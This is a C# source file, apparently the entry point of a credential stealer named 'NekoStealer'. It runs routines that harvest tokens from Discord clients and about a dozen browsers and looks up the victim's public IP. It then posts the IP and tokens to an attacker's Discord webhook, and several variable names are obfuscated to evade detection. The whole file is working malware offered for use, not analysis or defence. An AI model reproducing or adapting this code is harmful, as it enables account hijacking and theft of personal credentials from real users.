using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Text.RegularExpressions;
using System.Threading;
using System.Net.Http;
using System.Net;

namespace NekoStealer
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        public static List<string> goSendTokens = Stealing.AllTokens;
        [STAThread]
        static void Main()
        {
            Task.WaitAll(
            Stealing.DiscordApp(),
            Stealing.DiscordCanary(),
            Stealing.DiscordPTB(),
            Stealing.Chrome(),
            Stealing.ChromeBeta(),
            Stealing.FireFox(),
            Stealing.Opera(),
            Stealing.OperaGX(),
            Stealing.Edge(),
            Stealing.Yandex(),
            Stealing.Brave(),
            Stealing.EpicPrivacy(),
            Stealing.Vivaldi(),
            Stealing.ThreeHundredSixty(),
            Stealing.CocCoc()
            );

            string Tokens = string.Join(Environment.NewLine, goSendTokens.ToList());
            
            WebClient MلgغOYOعccSهوвKKVTQةش开PъбىKiاb = new WebClient();
            string احقی = MلgغOYOعccSهوвKKVTQةش开PъбىKiاb.DownloadString("https://api.ipify.org");

            Dictionary<string, string> Token = new Dictionary<string, string>
                    {
                        { "content", "\n@everyone Meow! :cat:" + "\nIP Adress: " + احقی + "\nTokens:\n" + Tokens},
                        { "avatar_url", Webhook.AvatarUrl},
                        { "username", Webhook.Username}
            };

            HttpClient cl1 = new HttpClient();
            cl1.PostAsync(Webhook.Url, new FormUrlEncodedContent(Token)).GetAwaiter().GetResult();  // FormUrlEncodedContent
        }
    }
}
